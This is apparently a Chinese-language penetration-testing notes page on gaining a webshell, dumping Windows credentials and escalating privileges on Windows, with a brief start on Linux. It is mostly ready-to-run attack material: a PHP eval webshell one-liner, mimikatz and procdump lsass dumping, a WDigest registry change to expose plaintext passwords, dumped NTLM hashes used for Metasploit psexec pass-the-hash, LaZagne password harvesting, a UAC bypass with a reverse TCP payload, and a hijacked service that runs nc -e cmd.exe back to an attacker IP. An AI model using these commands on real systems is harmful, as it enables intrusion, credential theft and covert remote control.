<h4 id="远程命令执行拿WebShell"><a href="#远程命令执行拿WebShell" class="headerlink" title="远程命令执行拿WebShell"></a>远程命令执行拿WebShell</h4><p>在有php代码执行漏洞,例如一些框架漏洞的时候可以通过执行一些系统命令进行拿WebShell。执行命令行命令“写入如下内容到文件，会自动将创建木马文件并将一句话木马写入其中，使用菜刀连接即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ?php &quot;@eval($_POST[&#x27;CE&#x27;]);?&gt;&quot; &gt; x.php </span><br></pre></td></tr></table></figure>

<h4 id="头像上传拿WebShell"><a href="#头像上传拿WebShell" class="headerlink" title="头像上传拿WebShell"></a>头像上传拿WebShell</h4><p>大概思路：<br>①将大马放在文件夹中<br>②将文件夹压缩成压缩文件（zip）<br>③正常上传一个头像并且抓包<br>④将数据包中图片头像的内容部分删掉<br>⑤重新写入文件内容，将压缩文件写入到原本图片的位置<br>⑥上传，之后返回包中会告诉我们绝对路径</p>
<h1 id="管理员密码提取"><a href="#管理员密码提取" class="headerlink" title="管理员密码提取"></a>管理员密码提取</h1><p><strong>需要以管理员用户登录，才能提取密码</strong></p>
<h2 id="mimikatz工具读取"><a href="#mimikatz工具读取" class="headerlink" title="mimikatz工具读取"></a>mimikatz工具读取</h2><p>当目标为WindowsXP-2012等操作系统时，通过以下命令可以直接提取到明文密码（需要以管理员身份登录）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpassWords&quot; exit&gt;123.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提升权限</span></span><br><span class="line">privilege::debug</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文（可能出现问题）</p>
<p>1、修改注册表，让Wdigest Auth 保存明文口令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>

<p>2、重启或注销登录，导出lsass.dmp</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p>3、然后拿到 mimikatz 文件夹执行命令读明文</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>



<h2 id="本地hash远程攻击"><a href="#本地hash远程攻击" class="headerlink" title="本地hash远程攻击"></a>本地hash远程攻击</h2><p>1、获取sam文件中administrator的hash密码</p>
<p>使用pwdump工具获取密码</p>
<p>​	<a target="_blank" rel="noopener" href="https://www.openwall.com/passwords/windows-pwdump">Windows PWDUMP tools</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\桌面\pwdump8-8.2\pwdump7&gt;PwDump7.exe</span><br><span class="line">Pwdump v7.1 - raw password extractor</span><br><span class="line">Author: Andres Tarasco Acuna</span><br><span class="line">url: http://www.514.es</span><br><span class="line"></span><br><span class="line">Administrator:500:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA8854737681</span><br><span class="line">8D4:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">SUPPORT_388945a0:1001:NO PASSWORD*********************:B7BF2AD63C27101B314C28578</span><br><span class="line">FE3F1B9:::</span><br><span class="line">IUSR_GOLD-DFD1EF44BA:1003:587598BDB5B2EA09B2D2D1539A5CC67F:5C79A5D27C799E4E033C3</span><br><span class="line">96BDCEBD0ED:::</span><br><span class="line">IWAM_GOLD-DFD1EF44BA:1004:5858D28D62B2A756E9B758B2D3F45F97:1ABB238FC5AD200853D15</span><br><span class="line">FDC99B14207:::</span><br><span class="line">ASPNET:1006:CEBCC37474AA8AD3248733E5E96EA6DC:6D3A0F8AC892872D72EBFFD510F4BBEF:::</span><br><span class="line"></span><br><span class="line">test:1015:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537:::</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator\桌面\pwdump8-8.2\pwdump7&gt;</span><br></pre></td></tr></table></figure>



<p>2、利用msf提供的exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt;use exploit/windows/smb/psexec</span><br><span class="line">msf &gt;set RHOST 192.168.1.109</span><br><span class="line">msf &gt;set SMBUser administrator</span><br><span class="line">msf &gt;set SMBPass 44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA8854737681</span><br><span class="line">8D4</span><br><span class="line">msf &gt;exploit</span><br><span class="line">msf &gt;shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="使用LaZagne"><a href="#使用LaZagne" class="headerlink" title="使用LaZagne"></a>使用LaZagne</h2><p>强烈推荐：可以获取所有的密码：浏览器密码、wifi密码等信息</p>
<p>[LaZagne][(<a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe)]">https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe)]</a></p>
<p>1、安装依赖</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>2、基本使用</p>
<p>​	</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">抓取所有支持软件的密码</span></span><br><span class="line">laZagne.exe all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">抓取浏览器的密码：</span></span><br><span class="line">laZagne.exe browsers</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">把所有的密码写入一个文件：</span></span><br><span class="line">laZagne.exe all -oN -output D:\BaiduNetdiskDownload\LaZagne-master\LaZagne-master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解密域凭据（要解密域凭据，可以通过指定用户 Windows 密码的方式来完成。）：</span></span><br><span class="line">laZagne.exe all -password ZapataVive</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h1><h2 id="提权知识储备"><a href="#提权知识储备" class="headerlink" title="提权知识储备"></a>提权知识储备</h2><h3 id="常见提权方法"><a href="#常见提权方法" class="headerlink" title="常见提权方法"></a>常见提权方法</h3><blockquote>
<p>1、 溢出漏洞提权<br>2、 数据库提权<br>3、 第三方软件提权</p>
</blockquote>
<h3 id="Cmd命令无法执行原因分析"><a href="#Cmd命令无法执行原因分析" class="headerlink" title="Cmd命令无法执行原因分析"></a>Cmd命令无法执行原因分析</h3><p>有时通过webshell连接上操作系统后，cmd命令可能无法执行，原因一般都是被管理员降权或删除、组件被删除。<br>解决方法是通过脚本木马查找可读可写目录，上传cmd.exe，调用设定cmd路径（找可读可写目录不要选带空格目录）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#设置cmd执行路径</span><br><span class="line">setp c:\xxx\vvv\cmd.exe</span><br></pre></td></tr></table></figure>

<h3 id="提权常用命令讲解"><a href="#提权常用命令讲解" class="headerlink" title="提权常用命令讲解"></a>提权常用命令讲解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">whoami ——查看用户权限</span><br><span class="line">systeminfo ——查看操作系统，补丁情况</span><br><span class="line">ipconfig——查看当前服务器IP ipconfig /all</span><br><span class="line">net user——查看当前用户情况</span><br><span class="line">netstat ——查看当前网络连接情况  </span><br><span class="line">netstat –ano  /netstat –an | find “ESTABLISHED”</span><br><span class="line">tasklist ——查看当前进程情况 tasklist /svc</span><br><span class="line">taskkill ——结束进程 taskkill -PID xx</span><br><span class="line">net start  ——启动服务</span><br><span class="line">net stop ——停止服务</span><br><span class="line">hostname ——获取主机名称</span><br><span class="line">quser or query user ——获取在线用户</span><br><span class="line">netstat -ano | findstr 3389 ——获取rdp连接来源IP</span><br><span class="line">dir c:\programdata\ ——分析安装杀软</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn ——列出已安装的补丁</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber ——获取远程端口</span><br><span class="line">tasklist /svc | find &quot;TermService&quot; + netstat -ano ——获取远程端口</span><br></pre></td></tr></table></figure>

<h2 id="系统溢出漏洞提权实战"><a href="#系统溢出漏洞提权实战" class="headerlink" title="系统溢出漏洞提权实战"></a>系统溢出漏洞提权实战</h2><h3 id="零、系统溢出漏洞提权分类："><a href="#零、系统溢出漏洞提权分类：" class="headerlink" title="零、系统溢出漏洞提权分类："></a><strong>零、系统溢出漏洞提权分类：</strong></h3><ol>
<li>远程溢出<br>攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用相应的溢出程序，即可获取到远程服务器的root权限。</li>
<li>本地溢出<br>首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，<br>攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限</li>
</ol>
<h3 id="一、UAC绕过提权"><a href="#一、UAC绕过提权" class="headerlink" title="一、UAC绕过提权"></a>一、UAC绕过提权</h3><p>UAC（User Account Control）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。<br>当获得的权限是属于管理员组的时候但是并不是administrator这个用户，此时就可能需要我们进行绕过UAC的操作，否则虽然是管理员组但是实际上并没有管理员所对应的高权限操作,这个时候就需要bypass uac。</p>
<p><strong>uac 绕过exp</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#用kali</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background  [*] Backgrounding session 1... </span><br><span class="line">msf5 exploit(multi/handler) &gt; use exploit/windows/local/ask </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set session 1 </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set lhost 192.168.60.79 </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set lport 4444 </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set technique exe </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; exploit </span><br><span class="line"></span><br><span class="line">其他exp:</span><br><span class="line">use exploit/windows/local/bypassuacuse</span><br><span class="line">exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure>

<h3 id="二、利用系统内核溢出漏洞提权"><a href="#二、利用系统内核溢出漏洞提权" class="headerlink" title="二、利用系统内核溢出漏洞提权"></a>二、利用系统内核溢出漏洞提权</h3><p>此提权方法即是通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限。</p>
<p><strong>微软官方时刻关注漏洞补丁列表网址:</strong><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a></p>
<blockquote>
<p>比如常用的几个已公布的 exp：KB2592799、KB3000061、KB2592799</p>
</blockquote>
<p><strong>github中整理好的溢出提权exp：</strong><br><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a target="_blank" rel="noopener" href="https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a><br><a target="_blank" rel="noopener" href="https://github.com/AusJock/Privilege-Escalation">https://github.com/AusJock/Privilege-Escalation</a></p>
<h4 id="如何判断可用的漏洞"><a href="#如何判断可用的漏洞" class="headerlink" title="如何判断可用的漏洞"></a>如何判断可用的漏洞</h4><ol>
<li><p><strong>快速查找操作系统未打补丁脚本</strong><br>可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;micropoor.txt&amp;(for \%i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i &quot;\%i&quot;|| @echo \%i you can fuck)&amp;del /f /q /a micropoor.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>MSF后渗透扫描：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Powershell扫描：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module C:\Sherlock.ps1</span><br><span class="line">Find-AllVulns</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="三、利用SC将administrator提权至system"><a href="#三、利用SC将administrator提权至system" class="headerlink" title="三、利用SC将administrator提权至system"></a>三、利用SC将administrator提权至system</h3><p><strong>试用版本：</strong>windows 7、8、03、08、12、16</p>
<p>关于sc命令：SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= “cmd /K start” type= own type= interact</span><br><span class="line">sc start systcmd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>命令含义：<br>创建一个名叫syscmd的新的交互式的cmd服务<br>然后执行<code>sc start systcmd</code>，就得到了一个system权限的cmd环境</p>
</blockquote>
<h3 id="四、利用不带引号的服务路径"><a href="#四、利用不带引号的服务路径" class="headerlink" title="四、利用不带引号的服务路径"></a>四、利用不带引号的服务路径</h3><p><strong>检测方法</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>Windows命令解释程序可能会遇到名称中的空格，并且没有包装在引号中的时候。就有可能出现解析漏洞。</strong><br>如开机自启动中有程序路径<code>C:\Program Files\Vulnerable.exe</code>,其中存在空格，此时在C盘根目录上传Program.exe文件时，可能会被目标开机自启动。如果无效，还可以尝试在C:\Program Files路径下上传Vulnerable.exe文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Vulnerable.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub Directory\service.exe</span><br></pre></td></tr></table></figure>

<p><strong>可以使用以下命令查看错误配置的路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="五、利用不安全的服务权限"><a href="#五、利用不安全的服务权限" class="headerlink" title="五、利用不安全的服务权限"></a>五、利用不安全的服务权限</h3><p><strong>⚫即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它。</strong><br><strong>AccessChk工具可以用来查找用户可以修改的服务：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv “Authenticated Users” * /accepteula</span><br><span class="line">accesschk.exe -uwcqv “user” *</span><br></pre></td></tr></table></figure>

<p><strong>sc命令也可以用来查找用户可以修改的服务：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查找可以修改的服务</span><br><span class="line">sc qc “Service”  </span><br><span class="line"></span><br><span class="line">sc config xxx binpath= “net user rottenadmin P@ssword123! /add”</span><br><span class="line">sc stop xxx</span><br><span class="line">sc start xxx</span><br></pre></td></tr></table></figure>

<p>每当我们开启服务时sc命令都返回了一个错误。这是因为net user命令没有指向二进制服务，因此SCM无法 与服务进行通信，通过使用执行自动迁移到新进程的payload，手动迁移进程，或者在执行后将服务的bin路径设置回原始服务二进制文件，可以解决这个问题。或者我们在权限允许的情况下，将我们的木马放到服务目录下，并重命名为服务启动的应用名称。电脑重启时即可获得一个system的shell</p>
<h5 id="完整案例："><a href="#完整案例：" class="headerlink" title="完整案例："></a>完整案例：</h5><p><strong>①、利用系统自带的 DcomLaunch服务测试(此服务Power User组低权可操作)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#查询DcomLaunch的详细信息</span><br><span class="line">sc qc DcomLaunch</span><br><span class="line">#查看服务是否启动</span><br><span class="line">net start | find &quot;DCOM Server Process Launcher&quot;  </span><br><span class="line"></span><br><span class="line">#运行 tasklist /svc  找到对应服务</span><br><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<p><strong>②、修改服务并获取系统权限</strong></p>
<p>这里要配置使用nc反弹shell到我的攻击机上，把nc放到c:\windows\temp目录下，使用sc对服务进行修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config DcomLaunch binpath= &quot;C:\wmpub\nc.exe -nv 192.168.32.194 4433 -e C:\WINDOWS\system32\cmd.exe&quot;  </span><br></pre></td></tr></table></figure>

<p>⛔注意<code>binpath=</code>后面一定要有个空格，IP为攻击者IP</p>
<p><strong>③、查看是否第二步成功</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc DcomLaunch </span><br></pre></td></tr></table></figure>

<p><strong>④、配置账号密码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config DcomLaunch obj= &quot;.\LocalSystem&quot;  password= &quot;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>obj：</strong>指定运行服务将使用的帐户名，或指定运行驱动程序将使用的 Windows 驱动程序对象名。默认设置为 LocalSystem。<br><strong>password：</strong>指定一个密码。如果使用了非 LocalSystem 的帐户，则此项是必需的。</p>
<p><strong>⑤、重启服务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start DcomLaunch </span><br></pre></td></tr></table></figure>

<p><strong>⑥、攻击机上用nc进行监听4433即可得到反弹的shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -vv -l -p 4433</span><br></pre></td></tr></table></figure>

<h3 id="六、计划任务"><a href="#六、计划任务" class="headerlink" title="六、计划任务"></a>六、计划任务</h3><p><strong>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看计算机的计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line">#查看指定目录的权限配置情况</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula</span><br></pre></td></tr></table></figure>

<h3 id="七、Meterpreter基础提权"><a href="#七、Meterpreter基础提权" class="headerlink" title="七、Meterpreter基础提权"></a>七、Meterpreter基础提权</h3><p><strong>首先在Meterpreter会话执行ps命令查看目标机当前进程：</strong><br>假设此处看到了一个进程，运行账户是域管理员，我们可以再第一栏找到对应的进程PID，假设PID为2584：<br>然后我们可以执行以下语句窃取该用户进程的令牌：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token  2584</span><br></pre></td></tr></table></figure>

<h2 id="溢出漏洞安全防范"><a href="#溢出漏洞安全防范" class="headerlink" title="溢出漏洞安全防范"></a>溢出漏洞安全防范</h2><p><strong>及时通过Windows Update或第三方工具360更新补丁</strong></p>
<h2 id="提权后获取管理员密码"><a href="#提权后获取管理员密码" class="headerlink" title="提权后获取管理员密码"></a>提权后获取管理员密码</h2><p>虽然我们已经有了管理员权限，但是我们最好是再获取管理员密码，原因如下</p>
<ol>
<li>很多管理员账号密码都设置成一样的，攻下一台就可以拿下所有</li>
<li>远程连接时，比如使用木马，很容易被发现或者清理</li>
<li>如果用管理员账号，可以清除渗透痕迹</li>
<li>正规渗透测试过程中，都是取得管理员账号密码，登录3389端口或反端口连接者证明为成功</li>
</ol>
<blockquote>
<p>简单地说就是从获取管理员权限——&gt;获取管理员账号</p>
</blockquote>
<h3 id="1、本地管理员密码如何直接提取"><a href="#1、本地管理员密码如何直接提取" class="headerlink" title="1、本地管理员密码如何直接提取"></a>1、本地管理员密码如何直接提取</h3><h4 id="①、直接通过mimikatz读取管理员密码"><a href="#①、直接通过mimikatz读取管理员密码" class="headerlink" title="①、直接通过mimikatz读取管理员密码"></a>①、直接通过mimikatz读取管理员密码</h4><blockquote>
<p>mimikatz，很多人称之为密码抓取神器，它的功能很多，最重要的是能从 lsass.exe进程中获取windows的账号及明文密码——这是以前的事了，微软知道后已经准备了补丁，lsass进程不再保存明文口令。Mimikatz 现在只能读到加密后的密码。<br><strong>win10无效</strong></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"># 抓取密码</span><br><span class="line">sekurlsa::logonpassWords</span><br></pre></td></tr></table></figure>

<p>当无法上传mimikatz工具到目标服务器时，可以利用procdump把lsass进程的内存文件导出本地，再在本地利用mimikatz读取密码，具体步骤如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 导出lsass.exe进程为lsass.dump文件</span><br><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>

<h4 id="②、Lazagne-需要本地支持python"><a href="#②、Lazagne-需要本地支持python" class="headerlink" title="②、Lazagne 需要本地支持python"></a>②、Lazagne 需要本地支持python</h4><blockquote>
<p>LaZagne项目是用于开源应用程序获取大量的密码存储在本地计算机上。每个软件都使用不同的技术（纯文本，API，自定义算法，数据库等）存储其密码。<br>LaZagne 几乎支持市面上大部分常用工具。包括浏览器、Git、SVN、Wifi、Databases 等。<br>但是对聊天软件的支持不够本土化，主要支持一些国外的聊天软件。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">laZagne.exe all  #获取所有密码</span><br><span class="line">laZagne.exe browsers  #只获取浏览器记住的密码</span><br><span class="line">laZagne.exe all -oN  #将输出保存到文件    </span><br></pre></td></tr></table></figure>

<p>-oN表示是纯文本格式（正常的）的输出，和屏幕打印内容相同；还可以写成-oJ，JSON格式的输出，更便于程序解析；或者写成-oA，同时输出两种格式。</p>
<h3 id="2、本地Hash远程直接登录"><a href="#2、本地Hash远程直接登录" class="headerlink" title="2、本地Hash远程直接登录"></a>2、本地Hash远程直接登录</h3><hr>
<p>高版本的系统，密码不是明文的情况下，直接通过哈希值来取得管理员账号。主要通过MSF提供的exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块来完成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf&gt;use exploit/windows/smb/psexec</span><br><span class="line">msf&gt;set rhost #目标IP </span><br><span class="line">msf&gt;set SMBUser administrator  #目标账号</span><br><span class="line">msf&gt;set SMBPass aaaaaa:bbbbbb  #目标哈希值</span><br><span class="line">msf&gt;exploit </span><br><span class="line">msf&gt;shell</span><br></pre></td></tr></table></figure>

<h3 id="3、Hash密钥暴力破解"><a href="#3、Hash密钥暴力破解" class="headerlink" title="3、Hash密钥暴力破解"></a>3、Hash密钥暴力破解</h3><hr>
<ol>
<li>通过LC5暴力hash密码<br>使用gmer直接提权SAM和system文件或用Pwdump7提取hash后，最后使用LC5破解</li>
<li>使用ophcrack破解系统hash密码<br><a target="_blank" rel="noopener" href="http://simeon.blog.51cto.com/18680/122160">http://simeon.blog.51cto.com/18680/122160</a></li>
</ol>
<h1 id="Linux系统提权"><a href="#Linux系统提权" class="headerlink" title="Linux系统提权"></a>Linux系统提权</h1><p>当拿到了一台Linux服务器的低权限账号后，要通过技术手段提权至 root 用户权限，以执行更多的操作。首先关于Linux提权我们得先明白几个概念。</p>
<h2 id="linux内核知识"><a href="#linux内核知识" class="headerlink" title="linux内核知识"></a>linux内核知识</h2><p>Linux内核版本号由3组数字组成：第一个组数字：内核主版本。 第二个组数字：偶数表示稳定版本；奇数表示开发中版本。第三个组数字：错误修补的次数。<br>3.10.0就是内核版本号。3就是内核主版本，10表示是稳定版，0表示错误修补次数是0。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#使用以下命令也可以看到系统内核及版本的一些信息：</span><br><span class="line">uname -a                 #查看内核的具体信息</span><br><span class="line">cat /proc/version        #查看内核的具体信息</span><br><span class="line">cat /etc/centos-release  #查看centos发行版本</span><br><span class="line">cat /etc/redhat-release  #查看redhat发行版本</span><br></pre></td></tr></table></figure>

